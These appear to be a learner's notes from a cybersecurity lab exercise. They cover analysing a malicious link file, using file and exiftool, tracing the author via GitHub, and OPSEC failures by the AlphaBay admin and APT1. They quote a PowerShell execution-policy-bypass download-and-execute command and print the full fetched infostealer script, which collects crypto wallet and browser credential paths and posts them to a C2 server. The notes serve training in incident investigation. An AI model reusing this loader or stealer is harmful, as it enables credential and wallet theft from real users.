******************************************
                    Day 1
******************************************

- Learn how to investigate malicious link files.
- Learn about OPSEC and OPSEC mistakes.
- Understand how to track and attribute digital identities in cyber investigations.

- Website investigation 

******************************************
                Investigation
******************************************               
- IP=10.10.63.164

Site Information email - theglitch@wareville.com

- file command
    - file "filename"
- exiftool
    - exiftool "filename"

- "Created by the one and only M.M." - GitHub Search
    - https://github.com/search?q=%22Created+by+the+one+and+only+M.M.%22&type=issues
    - https://github.com/Bloatware-WarevilleTHM/CryptoWallet-Search/issues/1

- Original written in C++ - Coverted to PowerShell
    - User provides too much information online surrounding themselves.

- Reusing usernames, email addresses, or account handles across multiple platforms. - Trying to cover their tracks would remove such obvious and incriminating information, but sometimes, it's due to vanity or simply forgetfulness.
- Using identifiable metadata in code, documents, or images, which may reveal personal information like device names, GPS coordinates, or timestamps.
- Posting publicly on forums or GitHub with details that tie back to their real identity or reveal their location or habits.
- Failing to use a VPN or proxy while conducting malicious activities allows law enforcement to track their real IP address.

**AlphaBay Admin Takedown**
- One of the most spectacular OPSEC failures involved Alexandre Cazes, the administrator of AlphaBay, one of the largest dark web marketplaces:
- Cazes used the email address "pimp_alex_91@hotmail.com" in early welcome emails from the site.
- This email included his year of birth and other identifying information.
- He cashed out using a Bitcoin account tied to his real name.
- Cazes reused the username "Alpha02" across multiple platforms, linking his dark web identity to forum posts under his real name.

**Chinese Military Hacking Group (APT1)**
- One member, Wang Dong, signed his malware code with the nickname "Ugly Gorilla".
- This nickname was linked to programming forum posts associated with his real name.
- The group used predictable naming conventions for users, code, and passwords.
- Their activity consistently aligned with Beijing business hours, making their location obvious.

*****************************************************
                Commandline Arguments
*****************************************************

- *-ep Bypass -nop -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1','C:\ProgramData\s.ps1'); iex (Get-Content 'C:\ProgramData\s.ps1' -Raw)"*
- *-ep Bypass -nop* flags disable PowerShell's restrictions, allowing scripts to run without interference from security settings or user profiles.
The DownloadFile method pulls a file from a remote server *(https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1)* and saves it in the C:\\ProgramData\\ directory on the target machine.
Once downloaded, the script is executed with PowerShell using the iex command

*****************************************************
                    GitHub Script
*****************************************************

function Print-AsciiArt {
    Write-Host "  ____     _       ___  _____    ___    _   _ "
    Write-Host " / ___|   | |     |_ _||_   _|  / __|  | | | |"  
    Write-Host "| |  _    | |      | |   | |   | |     | |_| |"
    Write-Host "| |_| |   | |___   | |   | |   | |__   |  _  |"
    Write-Host " \____|   |_____| |___|  |_|    \___|  |_| |_|"

    Write-Host "         Created by the one and only M.M."
}

# Call the function to print the ASCII art
Print-AsciiArt

# Path for the info file
$infoFilePath = "stolen_info.txt"

# Function to search for wallet files
function Search-ForWallets {
    $walletPaths = @(
        "$env:USERPROFILE\.bitcoin\wallet.dat",
        "$env:USERPROFILE\.ethereum\keystore\*",
        "$env:USERPROFILE\.monero\wallet",
        "$env:USERPROFILE\.dogecoin\wallet.dat"
    )
    Add-Content -Path $infoFilePath -Value "`n### Crypto Wallet Files ###"
    foreach ($path in $walletPaths) {
        if (Test-Path $path) {
            Add-Content -Path $infoFilePath -Value "Found wallet: $path"
        }
    }
}

# Function to search for browser credential files (SQLite databases)
function Search-ForBrowserCredentials {
    $chromePath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"
    $firefoxPath = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\logins.json"

    Add-Content -Path $infoFilePath -Value "`n### Browser Credential Files ###"
    if (Test-Path $chromePath) {
        Add-Content -Path $infoFilePath -Value "Found Chrome credentials: $chromePath"
    }
    if (Test-Path $firefoxPath) {
        Add-Content -Path $infoFilePath -Value "Found Firefox credentials: $firefoxPath"
    }
}

# Function to send the stolen info to a C2 server
function Send-InfoToC2Server {
    $c2Url = "http://papash3ll.thm/data"
    $data = Get-Content -Path $infoFilePath -Raw

    # Using Invoke-WebRequest to send data to the C2 server
    Invoke-WebRequest -Uri $c2Url -Method Post -Body $data
}

# Main execution flow
Search-ForWallets
Search-ForBrowserCredentials
Send-InfoToC2Server 


